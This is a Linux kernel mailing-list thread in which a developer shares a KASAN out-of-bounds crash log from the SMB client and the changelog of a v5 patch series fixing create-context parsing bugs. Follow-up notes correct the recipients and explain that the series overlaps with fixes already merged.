> > [ 1344.781773] [  T11242] RAX: ffffffffffffffda RBX: 00007fc594100780 R=
CX: 00007fc594192687
> > [ 1344.781776] [  T11242] RDX: 0000000000000000 RSI: 00007ffc7d27be31 R=
DI: ffffffffffffff9c
> > [ 1344.781778] [  T11242] RBP: 0000000000000001 R08: 0000000000000000 R=
09: 0000000000000000
> > [ 1344.781780] [  T11242] R10: 0000000000000000 R11: 0000000000000202 R=
12: 000056239611ba00
> > [ 1344.781782] [  T11242] R13: 00007ffc7d27b3c0 R14: 0000000000000000 R=
15: 0000000000040000
> > [ 1344.781814] [  T11242]  </TASK>
> >
> > [ 1344.781876] [  T11242] Allocated by task 11240:
> > [ 1344.781885] [  T11242]  kasan_save_stack (mm/kasan/common.c:58)
> > [ 1344.781894] [  T11242]  kasan_save_track (mm/kasan/common.c:70 (disc=
riminator 1) mm/kasan/common.c:79 (discriminator 1))
> > [ 1344.781900] [  T11242]  __kasan_slab_alloc (mm/kasan/common.c:463 (d=
iscriminator 1))
> > [ 1344.781905] [  T11242]  kmem_cache_alloc_noprof (mm/slub.c:4510 mm/s=
lub.c:4886 mm/slub.c:4917)
> > [ 1344.781911] [  T11242]  mempool_alloc_noprof (mm/mempool.c:608)
> > [ 1344.781925] [  T11242]  cifs_small_buf_get (fs/smb/client/misc.c:237=
 (discriminator 2))
> > [ 1344.781931] [  T11242]  allocate_buffers (fs/smb/client/connect.c:65=
4)
> > [ 1344.781938] [  T11242]  cifs_demultiplex_thread (fs/smb/client/conne=
ct.c:1287)
> > [ 1344.781943] [  T11242]  kthread (kernel/kthread.c:880)
> > [ 1344.781958] [  T11242]  ret_from_fork (arch/x86/kernel/process.c:196=
 (discriminator 1))
> > [ 1344.781973] [  T11242]  ret_from_fork_asm (arch/x86/entry/entry_64.S=
:258)
> >
> > [ 1344.781996] [  T11242] The buggy address belongs to the object at ff=
1100007e4b2fc0
> > which belongs to the cache cifs_small_rq of size 448
> > [ 1344.782002] [  T11242] The buggy address is located 0 bytes to the r=
ight of
> > allocated 448-byte region [ff1100007e4b2fc0, ff1100007e4b3180)
> >
> > [ 1344.782011] [  T11242] The buggy address belongs to the physical pag=
e:
> > [ 1344.782025] [  T11242] page: refcount:0 mapcount:0 mapping:000000000=
0000000 index:0xff1100007e4b34c0 pfn:0x7e4b0
> > [ 1344.782036] [  T11242] head: order:2 mapcount:0 entire_mapcount:0 nr=
_pages_mapped:0 pincount:0
> > [ 1344.782045] [  T11242] flags: 0xfff00000000240(workingset|head|node=
=3D0|zone=3D1|lastcpupid=3D0x7ff)
> > [ 1344.782056] [  T11242] page_type: f5(slab)
> > [ 1344.782069] [  T11242] raw: 00fff00000000240 ff11000105b8edc0 ffd400=
000418d610 ff11000105b90948
> > [ 1344.782075] [  T11242] raw: ff1100007e4b34c0 0000000800190013 000000=
00f5000000 0000000000000000
> > [ 1344.782080] [  T11242] head: 00fff00000000240 ff11000105b8edc0 ffd40=
0000418d610 ff11000105b90948
> > [ 1344.782085] [  T11242] head: ff1100007e4b34c0 0000000800190013 00000=
000f5000000 0000000000000000
> > [ 1344.782089] [  T11242] head: 00fff00000000002 ffffffffffffff01 00000=
000ffffffff 00000000ffffffff
> > [ 1344.782094] [  T11242] head: ffffffffffffffff 0000000000000000 00000=
000ffffffff 0000000000000004
> > [ 1344.782098] [  T11242] page dumped because: kasan: bad access detect=
ed
> > [ 1344.782111] [  T11242] page_owner tracks the page as allocated
> > [ 1344.782643] [  T11242] page last allocated via order 2, migratetype =
Unmovable, gfp_mask 0xd2800(GFP_NOWAIT|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEM=
ALLOC), pid 10789, tgid 10789 (umount), ts 770745347902, free_ts 7707421869=
38
> > [ 1344.784632] [  T11242]  post_alloc_hook (mm/page_alloc.c:2232 mm/pag=
e_alloc.c:2259)
> > [ 1344.784658] [  T11242]  get_page_from_freelist (mm/page_alloc.c:1738=
 mm/page_alloc.c:1904 mm/page_alloc.c:3234 mm/page_alloc.c:3410 mm/page_all=
oc.c:3945)
> > [ 1344.784668] [  T11242]  __alloc_frozen_pages_noprof (include/linux/g=
fp.h:272 (discriminator 1) include/linux/gfp.h:287 (discriminator 1))
> > [ 1344.784677] [  T11242]  alloc_pages_mpol+0x14a/0x440
> > [ 1344.784697] [  T11242]  new_slab (mm/slub.c:1604)
> > [ 1344.784712] [  T11242]  ___slab_alloc (mm/slub.c:4448)
> > [ 1344.784722] [  T11242]  kmem_cache_alloc_noprof (arch/x86/include/as=
m/preempt.h:95 (discriminator 1) mm/slub.c:4771 (discriminator 1) mm/slub.c=
:4883 (discriminator 1) mm/slub.c:4950 (discriminator 1))
> > [ 1344.784731] [  T11242]  mempool_alloc_noprof (mm/mempool.c:608)
> > [ 1344.784741] [  T11242]  cifs_small_buf_get (fs/smb/client/misc.c:237=
 (discriminator 2))
> > [ 1344.784751] [  T11242]  __smb2_plain_req_init (fs/smb/client/smb2pdu=
.c:565)
> > [ 1344.784761] [  T11242]  SMB2_tdis (fs/smb/client/smb2pdu.c:3097)
> > [ 1344.784772] [  T11242]  cifs_put_tcon (fs/smb/client/connect.c:2911 =
(discriminator 1))
> > [ 1344.784781] [  T11242]  cifs_put_tlink (arch/x86/include/asm/bitops.=
h:202 arch/x86/include/asm/bitops.h:232 include/asm-generic/bitops/instrume=
nted-non-atomic.h:142 fs/smb/client/connect.c:2905)
> > [ 1344.784790] [  T11242]  cifs_umount (fs/smb/client/connect.c:4010 (d=
iscriminator 1))
> > [ 1344.784799] [  T11242]  deactivate_locked_super (fs/super.c:485)
> > [ 1344.784821] [  T11242]  cleanup_mnt (include/linux/llist.h:283 (disc=
riminator 5) fs/namespace.c:1325 (discriminator 5))
> > [ 1344.784837] [  T11242] page last free pid 10789 tgid 10789 stack tra=
ce:
> > [ 1344.785506] [  T11242]  __free_frozen_pages (mm/page_alloc.c:5462)
> > [ 1344.785518] [  T11242]  stack_depot_save_flags (lib/stackdepot.c:473=
 lib/stackdepot.c:706)
> > [ 1344.785564] [  T11242]  set_track_prepare (arch/x86/include/asm/pree=
mpt.h:95 (discriminator 1) include/linux/bit_spinlock.h:41 (discriminator 1=
) mm/slub.c:628 (discriminator 1) mm/slub.c:655 (discriminator 1))
> > [ 1344.785574] [  T11242]  ___slab_alloc (mm/slub.c:4441)
> > [ 1344.785584] [  T11242]  __kmalloc_cache_noprof (mm/slub.c:5777)
> > [ 1344.785595] [  T11242]  kobject_uevent_env (include/linux/slab.h:950=
 include/linux/slab.h:1188 lib/kobject_uevent.c:543)
> > [ 1344.785612] [  T11242]  device_del (drivers/base/core.c:1642 drivers=
/base/core.c:3884)
> > [ 1344.785660] [  T11242]  device_unregister (drivers/base/core.c:3922)
> > [ 1344.785670] [  T11242]  bdi_unregister (mm/backing-dev.c:1013)
> > [ 1344.785690] [  T11242]  generic_shutdown_super (fs/super.c:666)
> > [ 1344.785700] [  T11242]  kill_anon_super (fs/super.c:1293)
> > [ 1344.785709] [  T11242]  cifs_kill_sb (fs/smb/client/cifsfs.c:349)
> > [ 1344.785719] [  T11242]  deactivate_locked_super (fs/super.c:485)
> > [ 1344.785728] [  T11242]  cleanup_mnt (include/linux/llist.h:283 (disc=
riminator 5) fs/namespace.c:1325 (discriminator 5))
> > [ 1344.785739] [  T11242]  task_work_run (kernel/task_work.c:232)
> > [ 1344.785755] [  T11242]  exit_to_user_mode_loop (kernel/entry/syscall=
_user_dispatch.c:114 (discriminator 1))
> >
> > [ 1344.785783] [  T11242] Memory state around the buggy address:
> > [ 1344.785790] [  T11242]  ff1100007e4b3080: 00 00 00 00 00 00 00 00 00=
 00 00 00 00 00 00 00
> > [ 1344.785799] [  T11242]  ff1100007e4b3100: 00 00 00 00 00 00 00 00 00=
 00 00 00 00 00 00 00
> > [ 1344.785807] [  T11242] >ff1100007e4b3180: fc fc fc fc fc fc fc fc fc=
 fc fc fc fc fc fc fc
> > [ 1344.785813] [  T11242]                    ^
> > [ 1344.785821] [  T11242]  ff1100007e4b3200: fc fc fc fc fc fc fc fc fa=
 fb fb fb fb fb fb fb
> > [ 1344.785828] [  T11242]  ff1100007e4b3280: fb fb fb fb fb fb fb fb fb=
 fb fb fb fb fb fb fb
> > [ 1344.785835] [  T11242] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D
> > [ 1344.785843] [  T11242] Disabling lock debugging due to kernel taint
> > -----END crash log-----
> >
> > Best regards,
> > Zihan Xi
> >
> > changes in v5:
> >   - Guard the final preauth-hash update in patch 5 when resp_iov is NUL=
L,
> >     addressing the kernel test robot Smatch report:
> >     https://lore.kernel.org/r/202609241449.HlHmnZFZ-lkp@intel.com/
> >   - v4 Link: https://lore.kernel.org/all/cover.1789478666.git.zihanx@ne=
busec.ai/
> > changes in v4:
> >   - Bound NameOffset + NameLength by the current context, reject offset=
s
> >     before the context header, and skip known-handler dispatch for zero
> >     DataLength.
> >   - Defer response-buffer handoff until processed MIDs are synchronized=
 and
> >     preserve earlier CREATE responses for cancelled-mid cleanup on fail=
ures.
> >   - Account num_remote_opens only after close-work allocation succeeds =
and
> >     before queueing the asynchronous close.
> >   - Preserve SMB2_OP_OPEN_QUERY parser errors and document the overlap =
with
> >     Frank Sorenson's related smb2_parse_contexts() patch.
> >   - Update the QEMU user-mode network and guest interface instructions.
> >   - v3 Link: https://lore.kernel.org/all/cover.1788516372.git.zihanx@ne=
busec.ai/
> > changes in v3:
> >   - Split the POSIX handler check into a separate patch and corrected t=
he
> >     parser Fixes history.
> >   - v2 Link: https://lore.kernel.org/all/cover.1787486936.git.zihanx@ne=
busec.ai/
> > changes in v2:
> >   - Bound each response context by Next, read QFid data from DataOffset=
,
> >     and extend lease validation through LeaseFlags.
> >   - v1 Link: https://lore.kernel.org/all/eb1bc35611f91bd10a4772400b37fa=
c26f660956.1782579150.git.xizh2024@lzu.edu.cn/
> >
> > Zihan Xi (6):
> >   smb: client: fix create context out-of-bounds reads
> >   smb: client: validate POSIX create context length
> >   smb: client: close handle after create-context parsing failure
> >   smb: client: clean up failed cached directory opens
> >   smb: client: close completed creates on compound wait errors
> >   smb: client: preserve create-context parsing errors
> >
> >  fs/smb/client/cached_dir.c | 32 ++++++++++++------
> >  fs/smb/client/smb2inode.c  |  6 ++--
> >  fs/smb/client/smb2misc.c   |  9 +++--
> >  fs/smb/client/smb2ops.c    | 28 +++++++++++-----
> >  fs/smb/client/smb2pdu.c    | 54 +++++++++++++++++++++++-------
> >  fs/smb/client/transport.c  | 67 ++++++++++++++++++++++++++++++--------
> >  6 files changed, 148 insertions(+), 48 deletions(-)
> >
> > --
> > 2.43.0
> >
>
> Hi Paulo and Namjae,
>
> I noticed that I sent the v5 series with the wrong primary recipient.
> The series is already on lore under
> cover Message-ID
> <cover.1790398755.git.zihanx@nebusec.ai>.
>
> Frank's feedback on v3 asked me to send future versions to Paulo and
> copy Namjae. Sorry for missing that.
> I am sending this note to correct the direct notification.
>
> Best regards,
> Zihan

Hi Paulo and maintainers,

A clarification about this v5 reroll.

The series was generated against cifs/for-next at
9ca668da8e4c9, before the earlier version of these fixes was merged
through the cifs-fixes-7.3-rc5 tag.  The current cifs-next tree therefore
already contains the previous versions of the create-context and compound
cleanup fixes, so applying the complete v5 series to that tree produces
overlapping hunks.  This is expected and does not indicate a conflict in
those fixes.

The v5 reroll contains one additional source change in patch 5:

    if (num_processed =3D=3D num_rqst && resp_iov)

This guards the final pre-authentication hash update against a NULL
resp_iov and addresses the Smatch report from the kernel test robot:

https://lore.kernel.org/r/202609241449.HlHmnZFZ-lkp@intel.com/

That guard is not present in the current cifs-next tree.  Please disregard
the duplicate portions of the v5 series; I will send a focused follow-up
for this remaining NULL-dereference fix against the current tree.

Sorry for the confusion.

Best regards,
Zihan Xi
